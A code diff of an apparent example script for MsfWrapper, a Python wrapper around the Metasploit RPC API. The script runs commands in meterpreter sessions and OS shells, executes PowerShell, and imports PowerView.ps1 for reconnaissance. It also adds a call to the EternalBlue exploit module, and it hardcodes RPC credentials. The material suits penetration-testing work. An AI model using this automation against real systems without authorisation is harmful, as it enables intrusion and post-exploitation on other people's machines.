@@ -1,41 +1,24 @@
 #!/usr/bin/env python3
 
-import sys
 import asyncio
-from lib.msfrpc import Msfrpc, MsfAuthError, MsfError
+from msfclient import RpcClient, MsfAuthError, MsfError
 from MsfWrapper import MsfWrapper
 from IPython import embed
 
 
-# Create the RPC client and login
-client = Msfrpc({})
-try:
-    client.login('msf', '123')
-except MsfAuthError:
-    print('bad login')
-client.call('auth.token_add', ['123'])
-client.token = '123'
-
-
-# Get the console ID if you plan on interacting with the console
-c_ids = [x[b'id'] for x in client.call('console.list')[b'consoles']]
-if len(c_ids) < 1:
-    client.call('console.create')
-    c_ids = [x[b'id'] for x in client.call('console.list')[b'consoles']]
-    # Give it time to open fully
-    time.sleep(2)
-# All MSF data comes back as bytes so we gotta make it utf8
-c_id = c_ids[0].decode('utf8')
-# Clear the console buffer
-client.call('console.read', [c_id])[b'data']
+# Initiate the MsfWrapper class with the RPC client
+# These user and pw settings are not necessary as they're already 
+# set that way by default if you used the included msfrpc.rc file
+# but just here for demonstration
+# 'msf_api = MsfWrapper()' would do the exact same thing
+user = 'msf'
+pw = 'McInerneyWasHere'
+msf_api = MsfWrapper(user, pw)
+embed()
 
 
 # Start the asyncio loop
 loop = asyncio.get_event_loop()
-
-
-# Initiate the MsfWrapper class with the RPC client
-msf_api = MsfWrapper(client)
 
 
 # Get all the sessions available
@@ -52,7 +35,7 @@ for key in msf_api.sess_data:
 # Run a command inside the console
 cmd = 'echo McInerney was here'
 print('\n[*] Running console command: '+cmd)
-fut = asyncio.ensure_future(msf_api.run_console_cmd(c_id, cmd))
+fut = asyncio.ensure_future(msf_api.run_console_cmd(cmd))
 out, err = loop.run_until_complete(fut)
 print(out)
 
@@ -65,8 +48,11 @@ print('\n[*] Running session command: '+cmd)
 end_strs = ['windows']
 fut = asyncio.ensure_future(msf_api.run_session_cmd(sess_num, cmd, end_strs))
 out, err = loop.run_until_complete(fut)
-print('Output: '+out)
-print('Error: '+err)
+if out:
+    print('Output: '+out)
+if err:
+    print('Error: ')
+    print(err)
 
 
 # Drop into an OS shell from meterpreter and run a command
@@ -75,8 +61,16 @@ print('\n[*] Running OS shell command: '+cmd)
 end_strs = ['here']
 fut = asyncio.ensure_future(msf_api.run_shell_cmd(sess_num, cmd, end_strs))
 out, err = loop.run_until_complete(fut)
-print('Output: '+out)
-print('Error: '+err)
+if out:
+    print('Output: '+out)
+if err:
+    print('Error: ')
+    print(err)
+
+
+# Run a module
+mod = 'exploit/windows/smb/ms17_010_eternalblue'
+fut = asyncio.ensure_future(msf_api.run_module(mod, target_ips, extra_opts, start_cmd))
 
 
 # Run a PowerShell command
@@ -85,9 +79,11 @@ cmd = 'sleep 30; Write-Output "McInerney was here"'
 print('\n[*] Running slow PowerShell command: '+cmd)
 fut = asyncio.ensure_future(msf_api.run_psh_cmd_with_output(sess_num, cmd))
 out, err = loop.run_until_complete(fut)
-print('Output: '+out)
-print('Error: '+err)
-
+if out:
+    print('Output: '+out)
+if err:
+    print('Error: ')
+    print(err)
 
 # Import a PowerShell script
 msf_api.psh_import_folder = '/home/dan/tools/MsfWrapper/'
@@ -95,8 +91,11 @@ filename = 'PowerView.ps1'
 print('\n[*] Importing PowerShell script: '+filename)
 fut = asyncio.ensure_future(msf_api.import_psh(sess_num, filename))
 out, err = loop.run_until_complete(fut)
-print('Output: '+out)
-print('Error: '+err)
+if out:
+    print('Output: '+out)
+if err:
+    print('Error: ')
+    print(err)
 
 
 # Run a PowerShell cmdlet
@@ -104,8 +103,11 @@ cmd = 'Get-IPAddress'
 print('\n[*] Running PowerShell cmdlet: '+cmd)
 fut = asyncio.ensure_future(msf_api.run_psh_cmd_with_output(sess_num, cmd))
 out, err = loop.run_until_complete(fut)
-print(out)
-print(err)
+if out:
+    print('Output: '+out)
+if err:
+    print('Error: ')
+    print(err)
 
 
 # Drop into an IPython shell
